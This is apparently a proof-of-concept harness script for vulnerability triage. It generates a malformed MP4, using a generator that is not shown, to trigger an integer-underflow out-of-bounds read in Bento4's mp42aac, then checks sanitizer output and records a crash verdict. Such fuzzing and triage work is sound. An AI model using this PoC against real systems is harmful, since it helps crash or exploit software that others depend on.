#!/usr/bin/env bash
# PoC run script for VULN 001
# CWE-191 Integer Underflow → CWE-125 Out-of-Bounds Read
# File: Bento4/Source/C++/Core/Ap4EsDescriptor.cpp  lines 100-103

set -euo pipefail

POC_DIR="$(cd "$(dirname "$0")" && pwd)"
BINARY="/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac"
INPUT="${POC_DIR}/vuln_001.mp4"
OUTPUT="${POC_DIR}/vuln_001.aac"
STATUS_FILE="${POC_DIR}/vuln_001_status.txt"

echo "================================================================"
echo " VULN 001 – AP4_EsDescriptor Integer Underflow"
echo " Binary : ${BINARY}"
echo " Input  : ${INPUT}"
echo "================================================================"

# Step 1: Generate malicious MP4
echo ""
echo "[1] Generating malicious MP4..."
python3 "${POC_DIR}/vuln_001_gen.py"

# Step 2: Run mp42aac under ASAN/UBSAN
echo ""
echo "[2] Running: ${BINARY} '${INPUT}' '${OUTPUT}'"
echo "    (ASAN_OPTIONS and UBSAN_OPTIONS enabled for verbose reporting)"
echo ""

# Capture combined stdout+stderr
COMBINED_LOG="${POC_DIR}/vuln_001_run.log"

ASAN_OPTIONS="abort_on_error=1:print_stacktrace=1:detect_leaks=0" \
UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0" \
    "${BINARY}" "${INPUT}" "${OUTPUT}" \
    > "${COMBINED_LOG}" 2>&1 || EXIT_CODE=$?

EXIT_CODE=${EXIT_CODE:-0}

echo "[3] Binary exited with code ${EXIT_CODE}"
echo ""

# Show the full output
cat "${COMBINED_LOG}"

echo ""
echo "================================================================"
echo "[4] Scanning log for sanitizer signals..."
echo "================================================================"

ASAN_HIT=0
UBSAN_HIT=0
CRASH=0

if grep -qiE "AddressSanitizer|heap-buffer-overflow|stack-buffer-overflow|use-after-free|global-buffer-overflow|READ of size" "${COMBINED_LOG}" 2>/dev/null; then
    echo "  [ASAN] ERROR DETECTED in log"
    ASAN_HIT=1
fi

if grep -qiE "runtime error|undefined behavior|UBSan" "${COMBINED_LOG}" 2>/dev/null; then
    echo "  [UBSAN] ERROR DETECTED in log"
    UBSAN_HIT=1
fi

if [ "${EXIT_CODE}" -ne 0 ]; then
    echo "  [EXIT] Non-zero exit code: ${EXIT_CODE}"
    CRASH=1
fi

echo ""
echo "================================================================"
echo "[5] Summary"
echo "================================================================"

if [ "${ASAN_HIT}" -eq 1 ]; then
    VERDICT="CRASH_ASAN"
elif [ "${UBSAN_HIT}" -eq 1 ]; then
    VERDICT="CRASH_UBSAN"
elif [ "${CRASH}" -eq 1 ]; then
    VERDICT="CRASH_NONZERO_EXIT"
else
    VERDICT="COMPLETED_NO_CRASH"
fi

echo "  Verdict : ${VERDICT}"
echo "  ASAN hit: ${ASAN_HIT}"
echo "  UBSAN hit: ${UBSAN_HIT}"
echo "  Exit code: ${EXIT_CODE}"

# Write status file
{
    echo "VULN 001 – AP4_EsDescriptor Integer Underflow Run Status"
    echo "========================================================="
    echo "Date       : $(date -u +%Y-%m-%dT%H:%M:%SZ)"
    echo "Binary     : ${BINARY}"
    echo "Input      : ${INPUT}"
    echo "Exit code  : ${EXIT_CODE}"
    echo "ASAN hit   : ${ASAN_HIT}"
    echo "UBSAN hit  : ${UBSAN_HIT}"
    echo "Verdict    : ${VERDICT}"
    echo ""
    echo "--- Run log ---"
    cat "${COMBINED_LOG}"
} > "${STATUS_FILE}"

echo ""
echo "  Status written to: ${STATUS_FILE}"
echo "  Done."
